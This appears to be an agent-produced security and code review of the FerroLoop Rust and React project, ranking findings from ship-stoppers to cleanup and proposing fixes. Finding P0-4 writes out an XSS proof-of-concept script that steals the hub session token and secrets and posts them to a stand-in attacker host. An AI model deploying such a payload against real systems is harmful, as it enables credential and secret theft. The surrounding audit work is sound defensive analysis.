# FerroLoop whole-project code review — 2026-11-02

**Scope.** All ten Rust crates under `crates/`, the React UI under `ui/`,
`docs/`, root configs (`Cargo.toml`, `Dockerfile`, `compose.yaml`,
`.github/`, `.gitignore`, `.cargo/`, `contrib/`), and the AGENTS.md /
WORKFLOW.md invariants. Produced by seven parallel review agents, with
every finding anchored by file and line; the highest-severity claims were
spot-checked against source after the agents returned.

**Branch.** Report saved on `cloud/project-review-2026-11-02`. No pushes
to `main`.

## Baseline health

| Check | Result |
| --- | --- |
| `cargo check --workspace --all-targets` (1.98.0) | clean — 0 warnings, 0 errors |
| `cargo clippy --workspace --all-targets` (1.98.0) | clean — 0 warnings, 0 errors |
| `cargo test --workspace --no-fail-fast` (1.98.0) | all tests pass, 0 failures |
| `tsc --noEmit` (ui/) | clean |
| `vitest run` (ui/) | 333 / 333 pass across 31 files |

Minor environment note: the container ships rustc 1.97; the workspace
pins `rust-version = "1.98"`, so `rustup install 1.98.0` is required
before any `cargo` command. CI uses `rust:1.98-bookworm` and does not
have this problem (`Dockerfile:10`).

## Headline

The project is unusually disciplined for its size: hand-rolled HTTP/WS,
hand-rolled WebSocket framing, custom secrets vault and warrant layer,
two-engine storage with a tested migration path, and five near-identical
vendor adapters all share the same careful instinct — read defensively,
validate at the boundary, and route byte-level invariants through
dedicated regression tests. The byte-identity invariant for the GitHub
ledger is enforced by a guard test; the FerroStore migration path is
link-not-rename with inode re-checks; AEAD AAD binds policy; the warrant
key is pinned independent of token-carried keys; the UI goes through a
hand-rolled markdown engine with a URL allow-list; the hub uses
constant-time token comparison, single-use pairing codes, HttpOnly
cookies, and an SSRF-guarded resolver.

The findings cluster in three places:

1. **A hardened writer bypassed by `fl vault install`** — the one
   command that touches on-disk vendor configs does so with the plain
   `fs::write` + `.unwrap_or_else` pattern that `fl_mcp::sync` is
   explicitly designed to replace. Two P0s.
2. **The subprocess boundary leaks the parent environment** — vendor
   CLIs inherit every API key and gate secret in the hub's env.
3. **The Peer tier reaches further than it should** — session
   `/clear`/`/reforge`, lifecycle `/decommission`/`/remodel`, and
   `/gate/call` are reachable to any FerroWire peer with a valid
   bearer. The attachment path on `/api/v1/attachments/:filename`
   serves peer-uploaded HTML as `text/html` same-origin, which turns
   the previous points into a chained XSS → session takeover.

Everything else is cleanup, defense in depth, or latent-but-not-yet
reachable. The project does not have correctness problems in its
storage, protocol, or ledger — those three subsystems are the strongest
part of the codebase.

---

## P0 — ship-stopper or active exploit path

### P0-1  `fl vault install` silently destroys existing vendor configs

`crates/cli/src/cmd/vault.rs:595, 640`.
`upsert_json_mcp_server` reads `~/.claude.json`, `.mcp.json`,
`.agents/mcp_config.json`, `.muse/settings.json`, and
`upsert_toml_mcp_server` reads `.codex/config.toml`. On parse failure
each one runs
`serde_json::from_str::<Value>(&raw).unwrap_or_else(|_| json!({}))` (or
the TOML analogue), so a JSONC comment, a BOM, a trailing comma, or any
syntax the strict parser rejects causes the user's entire file (every
other MCP server they configured) to be replaced with a bare object
containing only the `ferrogate` entry.
`fl_mcp::vendor::json::open_with` refuses this exact situation with
`FileRefusal`; `fl vault install` reimplements the write and defeats
the guard.

**Fix.** Route `fl vault install` through `fl_mcp::sync::plan` /
`apply` (or at minimum call `vendor::json::open_with`); return a
`FileRefusal` on parse failure instead of overwriting. Verified
against source.

### P0-2  `fl vault install` writes vendor configs non-atomically

`crates/cli/src/cmd/vault.rs:624, 689`.
`fs::write(path, …)` truncates then writes; an interrupt or crash mid-
write leaves `~/.claude.json` / `.codex/config.toml` empty or half-
written, and under the same umask the file is world-readable.
`fl_mcp::sync::stage` + `persist` and `fl_mcp::catalog::save` already
do atomic sibling-tempfile + `sync_all` + `persist`; the vault helper
bypasses it.

**Fix.** Use `tempfile::NamedTempFile::new_in(parent).write_all().as_file().sync_all().persist(path)`,
same pattern as `cli/src/cmd/agent.rs:201`. Verified against source.

### P0-3  Child vendor CLIs inherit the full parent environment

`crates/exec/src/adapters/harness.rs:180`.
`Command::new(&self.binary)` sets `.args`, `.current_dir`, stdio and
`.process_group(0)`, but never `.env_clear()` or an allow-list. A
spawned `claude` subprocess therefore inherits every secret the hub
holds in-process: `OPENAI_API_KEY`, `GEMINI_API_KEY`, `XAI_API_KEY`,
`FL_VAULT_MASTER_KEY`, `FERROGATE_*`, plus any ambient
`HTTP(S)_PROXY`. A compromised or malicious vendor CLI, or any tool it
spawns, can read them with one `getenv`. This is the exact scenario
AGENTS.md's "boundary isolation" mandate is meant to prevent.

**Fix.** Build the subprocess env from an explicit per-dialect allow-
list (`PATH`, `HOME`, `USER`, `LANG`, `TERM`, plus only the vendor's
own `*_API_KEY`), then `env_clear()` everything else; let the warrant
layer splice in the vendor's own key per attempt. Verified against
source.

### P0-4  Peer-uploaded HTML/JS attachments served from the Hub origin → same-origin XSS

`crates/hub/src/api.rs:4102-4123` and `1345-1370`.
`POST /api/v1/sessions/:id/prompt` accepts base64 `attachments[]`
whose `name` passes a `[A-Za-z0-9._-]` sanitizer, i.e. any extension.
`GET /api/v1/attachments/:filename` returns the file with
`mime_type_for_path`, which maps `.html` to `text/html; charset=utf-8`
and `.js` to `application/javascript`, with no
`X-Content-Type-Options: nosniff`, no CSP, no `Content-Disposition:
attachment`, and no `sandbox`. The artifact preview path at
`api.rs:3027-3031` already does CSP; this one does not.

Combined with P1-1 (any Peer tier can upload) and P1-2 (session token
in `localStorage` and query strings), an authenticated FerroWire peer
can POST `pwn.html` whose body is `<script>fetch('/api/v1/gate/secrets',
{headers:{Authorization:'Bearer '+localStorage.fl_hub_session_token}})
.then(r=>r.json()).then(x=>fetch('https://evil',{method:'POST',body:
JSON.stringify(x)}))</script>` and, as soon as the Owner clicks it,
exfiltrate the hub's vault index and every tier-Owner endpoint.

**Fix.** On this route, force `application/octet-stream` with
`Content-Disposition: attachment` and `X-Content-Type-Options: nosniff`;
better, media-type-allow-list uploads at `POST /prompt` and refuse
anything that is not `image/*`, `application/pdf`, `text/plain`.
Verified against source.

### P0-5  Denied/blocked proxy requests leave no audit entry

`crates/gate/src/proxy.rs:469-477`.
`prepare_proxied_request_inner` only runs `vault.append_audit_log(…,
"allowed")` on the happy path, after `verify_host_ssrf`. Every
`PolicyDenied`, `SsrfBlocked`, `NoSuchSecret`, `InvalidUrl` and
placeholder-reflection error returns before the log call, so repeated
refused attempts from the wrong host, method, agent, or an SSRF target
leave zero rows in `gate-audit.jsonl`. For a zero-knowledge secrets
gate, denial *is* the operator signal — not logging it defeats the
point of having a secrets gate.

**Fix.** Append an audit entry on every exit from this function, with
`outcome` set to the error variant (`"denied:policy"`,
`"denied:ssrf"`, `"denied:placeholder"`); keep `"allowed"` for success.
Verified against source.

---

## P1 — serious correctness or security issue reachable on a plausible path

### P1-1  Peer tier can `/clear` or `/reforge` any session

`crates/hub/src/api.rs:5042-5080, 5088-5153`.
`handle_post_session_clear` has no `is_owner()` gate; the dispatch
flows into `state.clear_session_prompt_queue`,
`clear_session_model_override`, and `clear_or_reforge_session`. The
comment at `api.rs:5244` ("Owner only, unlike prompt and clear")
documents the omission as deliberate, but reforge erases queued
prompts and injects a synthesized persona reforge prompt into the live
vendor conversation — any FerroWire peer bearer can scuttle every
persona on demand.

**Fix.** Require `Caller::Owner` for `/clear` and `/reforge`, or route
peer-initiated resets through a warrant-scoped path mirroring
`balance_api.rs::authorize_apply`.

### P1-2  Session token placed in URL query string

`ui/src/api/client.ts:1299-1308, 1369-1380`; `ui/src/api/ws.ts:84`.
The token is forwarded via `?token=...` so `<img>`/`<iframe>`/`<a>`
can hit protected endpoints. On same-origin this surfaces the Bearer
value in reverse-proxy access logs, Tailscale observability, browser
history, bfcache, DevTools, and the `Referer` sent on any outbound
link rendered by the UI (markdown previews, external images).

**Fix.** Issue short-lived download tokens (one-shot, bound to a path)
from the hub, or stream raw bytes through `fetch` + object-URL so the
long-lived token stays off wire-visible URLs.

### P1-3  Session token stored in `localStorage`

`ui/src/api/client.ts:273, 643-651, 667-671`.
`localStorage` is readable by any script in the FerroDeck origin. Any
future XSS (see P0-4) instantly exfiltrates authority.

**Fix.** Move the Bearer token to an in-memory variable plus a
hub-set `HttpOnly; Secure; SameSite=Strict` cookie for the browser
flow; keep `localStorage` for only the public passkey metadata it
already stores.

### P1-4  PDF iframe has no `sandbox` attribute

`ui/src/components/ArtifactPreviewPane.tsx:2104`.
The PDF viewer renders `<iframe src={rawUrl}>` same-origin. Any
artifact ever served with `Content-Type: text/html` (hub mis-
classification, path confusion, future bug on the raw endpoint) runs
scripts in FerroDeck's origin and reads `fl_hub_session_token` out of
`localStorage`.

**Fix.** `sandbox="allow-same-origin allow-forms"` (never
`allow-scripts`), plus `referrerPolicy="no-referrer"`.

### P1-5  No concurrency cap on hub accept loop and WS fan-out

`crates/hub/src/ws.rs:97-131, 235-317`.
`HubServer::serve` `tokio::spawn`s every accepted connection with no
`Semaphore`. Each `handle_connection` grows a per-request buffer up
to `MAX_HTTP_REQUEST_BYTES = 24 MiB` for up to `HTTP_READ_TIMEOUT = 15
s`; a WS upgrade holds a `broadcast::Receiver` and a `TerminalManager`
indefinitely. With `trust_tailscale_headers=true` the daemon is
reachable to the tailnet, so any tailnet host can memory-exhaust the
hub by holding many slow HTTP requests (worst case ~24 MiB ×
connections) or by opening unlimited WS sessions and never reading.

**Fix.** Gate accept with a `Semaphore` sized to a sane concurrency
(503 above it); keep the initial header buffer small (64 KiB) and
raise only after `Content-Length`; per-authority cap on concurrent WS
sessions.

### P1-6  No per-attachment or aggregate size cap on `/prompt`

`crates/hub/src/api.rs:4809-4873`.
`payload.attachments` iterates with only the outer 24 MiB HTTP cap;
no `MAX_ATTACHMENT_BYTES`, no per-request aggregate. A Peer can push
~17 MiB of decoded bytes to `attachments/` per request on an hourly
sweep, and (chained with P0-4) stage reflected-XSS payloads.

**Fix.** Enforce `MAX_ATTACHMENT_BYTES` (and per-request aggregate)
before `fs::write`; charge Peer uploads against a per-actor budget.

### P1-7  `authenticate_api_request` opens the store on every failed auth

`crates/hub/src/api.rs:1234-1254`.
On a header-only miss (any invalid `Authorization`), the handler
takes a `HubStoreGuard`, which serializes against the global
`store_lock`. An attacker can send bogus bearers to force one `redb`
open per request, blocking legitimate traffic and discovery/watch
snapshots.

**Fix.** Short-circuit the second lookup when the token hash wasn't
seen in a bounded negative-result LRU, or put the store-reading leg
behind a per-source-ip token-bucket.

### P1-8  Bearer tokens accepted in `?token=` query string

`crates/hub/src/auth.rs:716-721`.
`authenticate_request` falls back to `query.get("token")` for both
Owner and Peer tiers. Query strings are captured by reverse proxies,
Tailscale observability, browser history, and the `Referer` sent to
outbound links.

**Fix.** Remove the `query` fallback for `Authorization`; if a
WebSocket must carry a token in URL for API-less clients, scope it to
a short-lived nonce exchanged by the `/auth/pair` route.

### P1-9  Migration downgrades `chmod 0400` failure to a warning

`crates/store/src/ferrostore/verify.rs:469-481`.
After `hard_link` succeeds, `set_permissions(redb_path, 0o400)` is
best-effort: a failure (NFS, root-owned, SELinux) only prints a
warning and still returns `Ok(report)`. AGENTS.md says the redb is
"kept read-only"; a user who later sets `FL_STORE_BACKEND=redb` can
write the stale copy and the two files diverge silently.

**Fix.** Promote chmod failure to `Err` (unlink the fresh `.fls`), or
mark the store unclean via `Memory::unclean` and surface it in `fl
store status`.

### P1-10  Migration publishes `fls_path` even when parent-dir fsync fails

`crates/store/src/ferrostore/verify.rs:461-467`.
`sync_dir(parent_dir(fls_path))` after `hard_link` is downgraded to a
warning. A crash before the kernel flushes the directory entry can
lose the just-published `.fls` while the redb has already been
chmod'd read-only.

**Fix.** Hold the parent-dir fd and defer the chmod until the sync
returns `Ok`; on failure unlink `fls_path`, leave the redb writable,
and return `Err`.

### P1-11  Decrypted plaintext never zeroized in `gate`

`crates/gate/src/vault.rs:300-366, 369-379`, `warrant.rs:249-258`,
`adapter.rs:156-169`.
`Vault::decrypt_raw` returns plaintext as a plain `String`.
`load_or_create_signing_key` holds the Ed25519 PKCS#8 seed in
`encoded: String` + `pkcs8: Vec<u8>`; `SetSecretArgs.value` is a
`String` for the whole call; `all_decrypted_for_scrubbing` returns a
`Vec<(String, String)>` of every secret. The master key is correctly
`write_volatile`-zeroed in `Vault::drop`, but nothing else is.
`grep -rE 'Zeroiz|zeroize' crates/gate` returns zero in-crate hits.

**Fix.** Adopt `zeroize::Zeroizing<String>` / `secrecy::SecretString`
for the decrypt return, `SetSecretArgs.value`, `ExternalSecret.value`,
and the PKCS#8 seed; propagate through `scrub_secrets` and
`verify_secret_constant_time`.

### P1-12  `verify_secret_constant_time` early-returns on length mismatch

`crates/gate/src/vault.rs:422-424`.
The xor-mask comparison with `black_box` is correct, but a length
mismatch returns immediately — an attacker who can time webhook
rejection latency learns the stored secret's byte length.

**Fix.** Always run the fixed-length comparison; seed `diff` with
`(a.len() ^ b.len()) as u8` and iterate for `max(a.len(), b.len())`
steps.

### P1-13  `execute_proxied_request` honors ambient `HTTP(S)_PROXY`

`crates/gate/src/proxy.rs:663-668`.
Agent built with `timeout_global`, `max_redirects(0)`,
`http_status_as_error(false)` but no `.proxy(None)`. `ureq` reads
`HTTPS_PROXY`/`HTTP_PROXY` from the environment.
`crates/exec/src/adapters/api.rs:541-548` is explicit and has a test
asserting it. Combined with P0-3's env inheritance, every proxied
request including the Bearer header can be redirected to an
attacker's proxy.

**Fix.** Add `.proxy(None)` here and mirror the api.rs assertion test.

### P1-14  `kill_process_group` resolves `sh`/`kill` through `PATH`

`crates/exec/src/adapters/harness.rs:391-398`.
On cancel/timeout/overspend the harness runs
`Command::new("sh").args(["-c", "kill -KILL -<pgid> 2>/dev/null"])`.
Combined with P0-3 the subprocess env already carries ambient `PATH`;
a planted `sh` wrapper runs with hub-daemon privileges at every
cancel.

**Fix.** Call `libc::killpg(pgid as i32, SIGKILL)` directly — `libc`
is already a transitive dep via `gate/src/vault.rs`'s `flock`.

### P1-15  Timed-out hosted-API calls bill real money the budget never records

`crates/exec/src/adapters/api.rs:313-350`.
On `CallError::Timeout` the attempt is recorded with `tokens_in =
tokens_out = 0, cost_usd_micros = 0`, yet most hosted vendors still
charge for the prompt. Against AGENTS.md's "fail fast on budget
exhaustion" mandate, repeated timeouts quietly drain spend.

**Fix.** On timeout, debit a conservative estimate from the budget
(the prompt-side cost already computed by `output_cap`) so the
aggregate rolls up without a vendor usage block.

### P1-16  `require_different_vendor` silently skipped for `AssigneeRule::Agent`

`crates/core/src/workflow.rs:678-695`.
`validate_reviewer_independence` guards the same-vendor check with
`(Some(upstream_vendor), Some(cand_vendor))`. For `AssigneeRule::Agent
{ name }` the arm at `679-682` only pulls an adapter out of
`AssigneeRule::Selector`; the `Agent` case returns `None`, and if
`override_adapter` is also `None` the whole conjunction is skipped. A
workflow author can commit `require_different_vendor = true` thinking
it's enforced when it isn't.

**Fix.** Make `validate_workflow_def` reject
`require_different_vendor` on a reviewer whose `Agent` assignee gives
no adapter; add the test the review flagged (`AssigneeRule::Agent` +
no `override_adapter` + `require_different_vendor=true`).

### P1-17  Bootstrap and background-refresh errors silently swallowed

`ui/src/App.tsx:1261-1276, 1092-1105, 859-883, 1045-1064, 1066-1073,
1021-1030`.
`getAuthSession` only reacts to HTTP 401; any 5xx/network error
leaves `authority` null without opening the pairing modal.
`loadAllInitialState` and the four refresh callbacks wrap every fetch
in `.catch(() => null)` or `catch { /* ignore */ }`. A hub that is up
but refusing renders an empty cockpit with no cue.

**Fix.** Route non-401 bootstrap errors into an inline banner;
`console.warn` with the `HubApiError`'s status+path in background
refresh and surface a persistent "sync paused" chip when any refresh
fails twice in a row.

### P1-18  README describes FerroWatch as "no code yet"

`README.md:59` (Roadmap item too).
`crates/watch` ships 5410 LOC; `fl watch` and `fl watch balance` are
live subcommands documented in `docs/getting-started.md:80`.

**Fix.** Rewrite the Ferro Suite row to describe the live surface;
drop the Roadmap item or narrow it to "FerroWatch repo extraction".

### P1-19  WORKFLOW.md mis-attributes protected paths to a Rust constant

`WORKFLOW.md:31-37`.
Names `DEFAULT_PROTECTED_PATTERNS` in `crates/core/src/pr_policy.rs`
and lists "instruction files, `.github/`, `.agents/`,
`.fl/manifest.json`". The constant is only `[".github/**",
".fl/manifest.json", ".agents/**"]` (`pr_policy.rs:77`); the test at
`pr_policy.rs:1152-1157` asserts `AGENTS.md`, `CLAUDE.md`,
`WORKFLOW.md`, `PERSONA.md` are *not* protected by
`is_protected_path`. The CI workflow adds those as a separate case
list.

**Fix.** Split the bullet into "Rust rule: three patterns" + "CI
workflow: instruction files on top", or widen the Rust constant to
match CI.

### P1-20  CI runs clippy and test without `--locked`

`.github/workflows/verify.yml:64, 70`.
Neither step passes `--locked`/`--frozen`, so a stale `Cargo.lock` is
silently re-resolved during CI and a lockfile-drift PR is not caught.

**Fix.** Add `--locked` to both steps; add a leading `cargo fetch
--locked` smoke check.

### P1-21  `.gitignore` ignores no secret paths

`.gitignore:1-26`.
For a project that ships a secrets vault, a GitHub App PEM, FerroStore
TLS/PSK material, and vendor API keys, the file ignores no `*.pem`,
`*.key`, `*.p12`, `*.pfx`, `.env`, `.env.*`, `vault.enc`, `*.psk`. A
`git add -A` after a dev drop commits them.

**Fix.** Add those patterns; consider a `gitleaks`/`secretlint` CI
step as belt-and-braces.

### P1-22  CI has no build cache

`.github/workflows/verify.yml`.
No `Swatinem/rust-cache` or `actions/cache` for `~/.cargo` + `target/`;
every PR cold-compiles 10 crates + `rustls`/`ring`/`tokio`/`redb`.

**Fix.** Add `Swatinem/rust-cache@<sha>` after `actions/checkout`,
keyed on `Cargo.lock`.

### P1-23  `fl vault install` clobbers a non-object `mcpServers` key

`crates/cli/src/cmd/vault.rs:605, 653`.
If a user's vendor file has `"mcpServers": "disabled"` or
`"mcpServers": [...]`, the code does `*servers = json!({})`, erasing
the original value. The hardened `fl_mcp::vendor::json::open_with`
returns `FileRefusal` here.

**Fix.** Refuse and ask the user to fix the file by hand, instead of
overwriting. Pairs with P0-1 and P0-2.

---

## P2 — latent bug, missing invariant check, defense-in-depth

Many; grouped by subsystem.

### P2 — hub

- `has_path_traversal` guards strings, not the final filesystem path;
  no `fs::canonicalize` check against `ui_dir`/`attachments_dir`
  (`api.rs:1331-1343` and callers at `1377-1402`, `4109-4124`).
- Session cookie lacks `Secure` when the hub is bound off-loopback
  (`auth.rs:390`, `operators.rs:1308/1376`).
- Store-open failures silently degrade busy/in-flight tracking to
  "no routes" (`lib.rs:551-610`).
- Peer can `/decommission` and `/remodel` any live-hosted session
  (`lifecycle.rs:1687-1714`, `api.rs:5504-5634`).
- `generate_hex_token` falls back to UUIDv7 if `SystemRandom::fill`
  fails and re-exposes a public API that credentials shouldn't use
  (`auth.rs:101-117`).
- `handle_post_session_prompt` persists attacker-chosen
  `media_type` into saved metadata (`api.rs:4858-4868`).
- TMUX helper busy-waits on `thread::sleep` from a blocking task
  (`lifecycle.rs:938-967`).
- WS frame parser does not reject unmasked client frames
  (`ws.rs:441-495`).
- WS `Continuation` opcode is a hard protocol error, refusing
  legitimately fragmented messages (`ws.rs:394-397`).
- Peer-sent `/wire/send` payloads propagate unvalidated into
  broadcast JSON (`api.rs:1617`).
- `/api/v1/gate/call` and `/api/v1/gate/mcp` grant Peer-tier callers
  the full vault-proxy surface, trusting `allowed_agents` scoping
  (`api.rs:6425-6481`).

### P2 — gate / exec

- `Host`/`Content-Length`/`Transfer-Encoding` passed through from
  `ProxyRequest.headers` without a case-insensitive filter
  (`gate/src/proxy.rs:670-712`).
- `scrub_secrets` is O(secrets × body) per response with full
  decrypt on each call (`gate/src/proxy.rs:523-570`,
  `vault.rs:369-379`).
- `description`, `created_at`, `updated_at`, `lease_ttl_secs` are
  not AAD-bound (`gate/src/vault.rs:661-670`).
- Non-consuming warrant verify and list skip the ledger lock
  (`gate/src/warrant.rs:508-521, 639-666`).
- `append_audit_log` silently drops write errors and opens the file
  per request (`gate/src/vault.rs:433-485`).
- `.expect("stdout piped")`/`.expect("stderr piped")` panics the hub
  task if a sandbox denies the pipe
  (`exec/src/adapters/harness.rs:220-221`).
- `extract_text_from_object` drops `tool_use`-only replies; attempt
  looks silently completed (`exec/src/adapters/harness.rs:624-657`).
- JSONL stream partial-line fragments silently discarded
  (`exec/src/adapters/harness.rs:528-622`).
- `redact` only matches literal key, misses base64/URL/hex forms
  (`exec/src/adapters/api.rs:551-556`).

### P2 — store

- Verifier samples at most 32 per-item views (`PER_ITEM_SAMPLE`)
  (`store/src/ferrostore/verify.rs:52-53, 1061-1078`).
- `lock_mutex` silently rescues `PoisonError`
  (`store/src/ferrostore/mod.rs:4073-4078`).
- WAL tail replay swallows decode errors into a full load
  (`store/src/ferrostore/mod.rs:623-626`).
- `view_parity` encodes "the view errored" as a self-matching row
  (`store/src/ferrostore/verify.rs:1082-1095`).
- `redb_engine_unlocked` opens the `.redb` without the migration
  lock when `lock_error_is_benign` (`store/src/any.rs:666-684,
  762-771`).
- `allocate_extent` uses `saturating_add` where it should refuse
  overflow (`store/src/ferrostore/mod.rs:3812-3824`).
- HNSW `prune` dedup can shrink neighbour count below the requested
  cap (`store/src/ferrostore/vector.rs:1046-1052`).
- HNSW `remove_node` half-repairs on error — safe only via staged
  copy (`store/src/ferrostore/vector.rs:712-740`).
- `plan_views` reads the entire wire-message log just to pick 32 ids
  (`store/src/ferrostore/verify.rs:1055-1062`).
- `settle_failed_publish` does not reset `Disk::read`
  (`store/src/ferrostore/mod.rs:661-674`).

### P2 — core / wire

- `advance_workflow` does not call `preflight_ceiling`
  (`core/src/workflow.rs:919-991`).
- `fallback_agent_iri` panics on an invalid slug via `.expect`
  (`core/src/ferrowire.rs:21-24`).
- Non-loopback `ws://` peer URLs accepted without enforcement
  (`wire/src/peer.rs:66-74`, `wire/src/daemon.rs:992-1009`).
- `WsStream::accept` validates only `Sec-WebSocket-Key`
  (`wire/src/ws.rs:239-275`).
- `ReceiptUpdate` fold matches by `recipient_id OR recipient_name`
  (`wire/src/daemon.rs:842-868`).
- `WsStream::connect` only tries the first DNS address
  (`wire/src/ws.rs:155-163`).

### P2 — cli / mcp / github

- `codex.rs` and `grok.rs` are near-duplicates
  (`mcp/src/vendor/codex.rs:19-119`, `grok.rs:12-113`).
- `QuarantineLine::encode` is not byte-stable under field reorder
  (`github/src/ledger/layout.rs:344-346`).
- `fl auth owner-grant` prints the bearer token to stdout with no
  protect-this-value notice (`cli/src/cmd/auth.rs:342`).
- `fl github ledger quarantine` writes to a public ledger
  permanently; warning only on stderr (`cli/src/cmd/ledger.rs:229-238`).
- `fl manifest export` is not an atomic write
  (`cli/src/cmd/manifest.rs:451`).
- `fl vault import-openapi` writes connectors non-atomically
  (`cli/src/cmd/vault.rs:419`).

### P2 — UI

- `renderInlineMarkdown` recurses without a depth cap
  (`ui/src/components/RichMarkdown.tsx:662-883`).
- Mermaid SVG embedded as `data:` href is a fragile shape
  (`ui/src/components/RichMarkdown.tsx:380-387`).
- `isCurrent()` guard protects socket events but not the exp-backoff
  counter from racing `connect()` calls (`ui/src/api/ws.ts:150-168`).
- Pending-frames queue cap drops oldest silently
  (`ui/src/api/ws.ts:27, 235-240`).
- Transcript loader `useEffect` deps on `authority?.tier` triggering
  unneeded refetch (`ui/src/App.tsx:1423-1490`).
- `applyFontScaleToElementTree` MutationObserver scans the whole
  cockpit subtree (`ui/src/App.tsx:588-613`).
- `handleOpenAgentSettingsFor` useCallback invalidates every poll
  (`ui/src/App.tsx:2103-2138`).
- No standalone tests for HubDrawer or RuntimesQuotasPanel.

### P2 — docs / CI / configs

- `npm ci || npm install` defeats UI lockfile reproducibility
  (`Dockerfile:6`).
- Dockerfile runs `fl` as root (`Dockerfile:18-34`).
- Dockerfile has no HEALTHCHECK.
- Image `cargo build` is not `--locked` (`Dockerfile:16`).
- Workspace `Cargo.toml` has no `[workspace.lints]`.
- No action pinned by SHA; `ubuntu-latest` floats
  (`.github/workflows/verify.yml:45, 47`,
  `request-admin-review.yml:27`).
- `compose.yaml` silently starts an unauthenticated hub when envs
  are unset (`compose.yaml:11-13`).
- Docker base images not pinned by digest (`Dockerfile:2, 10, 18`).
- `docs/ferrostore-spec.md` is an orphan reference, not linked from
  either doc index.
- Named CI check "test, clippy, fmt" is a merge gate with no rename
  guard.

---

## P3 — cleanup, simplification, cosmetic

Representative, not exhaustive — full list in the per-crate reports
under `/tmp/claude-0/.../scratchpad/review-*.md`.

- Five near-identical adapter files are copy-paste
  (`exec/src/adapters/{claude,codex,antigravity,muse,grok}.rs`);
  collapse to `SubscriptionAdapter<D: CliDialect>`.
- `AnyAdapter::with_liveness` silently drops liveness for boxed
  plugins (`exec/src/adapters/mod.rs:197`).
- `vault.key` parent dir inherits umask (`gate/src/vault.rs:842-858`).
- `now_at`/`now_unix_millis` duplicated across crates.
- `connector_to_registry_entry` hard-codes `PUBLISHED_AT`
  (`gate/src/registry.rs:11, 44-54`).
- `output_cap` prompt estimate ignores system-prompt + tool-def
  tokens (`exec/src/adapters/api.rs:438-466`).
- `GitSnapshot::capture` races `git status` with worktree hash
  (`exec/src/adapters/harness.rs:680-703, 778-804`).
- HNSW I8 quantize silently clips (`store/src/ferrostore/vector.rs:401-404`).
- `validate_graph_full` peaks at `n*dim*4` bytes per checkpoint.
- `FerroStore::auto` racey on serve-crash + quick restart.
- `migrate_locked` 60 s wait can be exceeded by a legitimately
  large migration (`store/src/any.rs:465-477`).
- `put_json_text` re-parses already-valid JSON through serde round-trip.
- `.migrate.lock` persists forever (documented trade-off).
- `authorize_step_sign_off` has an undocumented `caller == "owner"`
  alias (`core/src/workflow.rs:811-813`).
- `area_name` and `validate_slug` disagree on leading characters
  (`core/src/routing.rs:33-43` vs. `core/src/state.rs:59-75`).
- `parse_co_authors` matches by `name_key OR email` — DoS, not
  priv-esc (`core/src/pr_policy.rs:292-307`).
- Hub bind address lookup trusts `Host:` for `pair_url` generation
  (`hub/src/api.rs:583-596`).
- `handle_get_sessions` drives `drain_ready_session_queues` from the
  request thread (`hub/src/api.rs:1281-1291`).
- `fs::read` on static UI files has no size cap
  (`hub/src/api.rs:1388-1402`, `4117-4123`).
- Watch `WatchLivenessCounts::add` uses `+= 1` not `saturating_add`
  (`watch/src/liveness.rs:131-144`).
- UI: TurnCard attachment card is a `<div>` with onClick, no
  keyboard affordance (`ui/src/components/TurnCard.tsx:1162-1177`).
- UI: TurnCard "open" link `rel="noreferrer"` alone, not
  `rel="noopener noreferrer"` (`ui/src/components/TurnCard.tsx:1186`).
- UI: Composer attachment `<img src>` trusts user-supplied
  `media_type` prefix (`ui/src/components/ChatPane.tsx:3097-3108`).
- UI: Panel resize uses MouseEvents, not Pointer Events
  (`ui/src/App.tsx:471-477, 509-511`).
- UI: `preserveOptimisticTurn` can collide keys on discontiguous
  indices (`ui/src/App.tsx:227-230`).
- UI: `fetchGateData` has no cancellation flag
  (`ui/src/components/VaultGatePane.tsx:121-157`).
- UI: Link tooltip shows full raw URL
  (`ui/src/components/RichMarkdown.tsx:739-747`).
- `fl --help` is pasted into `docs/getting-started.md:52-87`.
- `.cargo/config.toml` sets `FL_SET_PROGRAM_TEST_HOOK=1` globally.
- `request-admin-review.yml` composes commands from bash arrays
  interpolating PR data.
- `contrib/ferroloop-hub.service` hard-codes an owner-specific
  WorkingDirectory.

---

## Cross-cutting themes

1. **The hardened writers are not uniformly used.** `fl_mcp::sync`
   and `fl_mcp::vendor::json::open_with` do all the right things;
   `fl vault install` doesn't call them. P0-1, P0-2, P1-23, P2
   (`fl manifest export`, `fl vault import-openapi`). Fix: audit
   every `fs::write` call in the workspace; route each through
   either `fl_mcp::sync::stage/persist` or
   `write_atomic_non_symlink`.
2. **The subprocess + hub-env surface leaks the daemon's own
   secrets.** P0-3 (env inheritance), P1-13 (`HTTP(S)_PROXY`
   honored in gate), P1-14 (`PATH` resolve for `sh`/`kill`),
   P2 (redact only matches literal key). Fix: a shared
   `scoped_subprocess_env(dialect)` helper and `.proxy(None)`
   everywhere, plus a single `redact::any_encoding` helper used by
   both exec and gate.
3. **Peer tier is treated as a slightly-less-trusted Owner, not an
   adversary.** P0-4 (attachment XSS), P1-1 (`/clear`/`/reforge`),
   P1-6 (no attachment cap), P1-7 (store open on failed auth),
   P2 (`/decommission`/`/remodel`, `/wire/send` echo,
   `/gate/call`/`/gate/mcp` surface). Fix: make Owner the default
   on every state mutation; expose peer-reachable mutations only
   through warrants.
4. **Audit log is best-effort.** P0-5 (deny path never logs),
   P2 (`append_audit_log` silently drops errors, opens on every
   request). Fix: audit log is a durability contract — surface
   failures to `tracing::warn!` and keep the writer open.
5. **"Fail fast on budget exhaustion" is almost true, not quite.**
   P1-15 (timed-out hosted calls don't bill), P2 (`advance_workflow`
   does not call `preflight_ceiling`). Fix: push the preflight into
   `advance_workflow`, debit a conservative estimate on timeout.
6. **The react UI's token lives in the DOM.** P1-2, P1-3, P1-4,
   plus the P0-4 chain. Fix: single server-set HttpOnly cookie flow,
   kill `?token=` entirely, token out of `localStorage`.
7. **Docs are mostly code-sourced but README is not.** P1-18, P1-19,
   P2 (orphan `ferrostore-spec.md`, docs index gaps). Fix: run a
   grep-based CI check that verifies every `fl <cmd>` named in docs
   has a matching `cmd` module, and that `README.md`'s suite table
   matches the crate list.
8. **CI is a thin trio with no cache and no lockfile freeze.** P1-20,
   P1-22, P2 (unpinned actions, `ubuntu-latest`, Dockerfile
   `||`-fallback). Fix: `--locked` everywhere, `Swatinem/rust-cache`,
   action pinning by SHA, pin ubuntu runner version, pin base image
   digests.

## Recommended landing order

To get the most risk off the table with the smallest diffs:

1. **P0-1 + P0-2 + P1-23** — one PR that routes `fl vault install`
   through `fl_mcp::sync` and deletes `upsert_json_mcp_server` /
   `upsert_toml_mcp_server`.
